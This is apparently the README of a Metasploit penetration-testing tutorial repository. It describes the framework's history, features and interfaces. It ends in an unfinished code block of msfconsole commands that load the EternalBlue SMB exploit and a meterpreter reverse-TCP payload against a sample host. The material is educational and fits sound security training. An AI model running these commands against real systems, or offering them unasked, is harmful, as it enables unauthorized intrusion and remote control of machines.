# Exploitation with Metasploit

This repository is a practical guide to using the **Metasploit Framework** for offensive security and penetration testing. Whether you're a beginner or looking to refine your red teaming skills, this repo walks you through key techniques and modules offered by Metasploit.

## What is Metasploit

**Metasploit** is a widely-used, modular framework designed for **penetration testing**, **exploit development**, and **vulnerability validation**. It provides security professionals and red teamers with a standardized environment for launching and managing exploits, payloads, and post-exploitation modules.

Before Metasploit, offensive security tools—such as exploits and shellcode—were scattered across various repositories, written in different languages, and often lacked standardization or trust. This made it difficult to ensure consistency, reusability, or safety. Metasploit changed that by introducing a unified framework where all components share a consistent structure and behavior.

Originally created by **HD Moore**, Metasploit began as an open-source Ruby-based project. It was later acquired by **Rapid7**, who now maintains both the **free Community Edition** and a **commercial Pro version**. The **Community Edition**, which this repository is based on, remains a powerful and capable tool, widely adopted in red teaming and security research.

### Key Features

- A massive and constantly updated library of exploits, payloads, auxiliary tools, and post-exploitation modules.
- Integration with vulnerability scanners and databases.
- Support for custom module development.
- A versatile command-line interface (`msfconsole`) and payload generator (`msfvenom`).
- Active community and frequent updates, supporting the latest platforms and vulnerabilities.

Whether you’re performing reconnaissance, gaining initial access, escalating privileges, or maintaining persistence, **Metasploit provides a robust foundation** for automating and scaling offensive operations.

> ⚠️ Note: This repository uses the **latest version** of the Metasploit Framework (Community Edition) as maintained by Rapid7. Ensure you keep your instance updated to leverage the newest modules and capabilities.

## Metasploit Interfaces

Metasploit provides multiple interfaces to accommodate different workflows, skill levels, and use cases. Each interface offers access to the framework’s core capabilities—exploitation, scanning, and payload delivery—but varies in terms of flexibility and user experience.

### Available Interfaces

1. **msfconsole** – The most powerful and widely-used interface.  
   It provides an interactive command-line environment with support for tab-completion, built-in help, and deep module interaction. This will be our primary focus throughout this repository.

2. **msfcli** – A legacy command-line interface designed for single-command usage.  
   *Note:* `msfcli` is deprecated and no longer included in recent versions of Metasploit.

3. **Armitage** – A GUI-based third-party interface built on top of Metasploit.  
   It visualizes targets and sessions, but has fallen out of favor and is largely considered outdated.

4. **msfweb** – A browser-based interface, once used for remote exploitation management.  
   This interface is no longer maintained and is considered deprecated in modern deployments.

### Why Use `msfconsole`

Among all interfaces, **`msfconsole` is the most robust, up-to-date, and actively supported**. It allows you to:

- Load and configure modules easily.
- Generate and handle payloads.
- Perform exploit automation.
- Integrate with external tools and databases.
- Manage sessions, jobs, and services—all in one shell.

You'll find yourself using commands like:

```bash
msfconsole
search type:exploit platform:windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
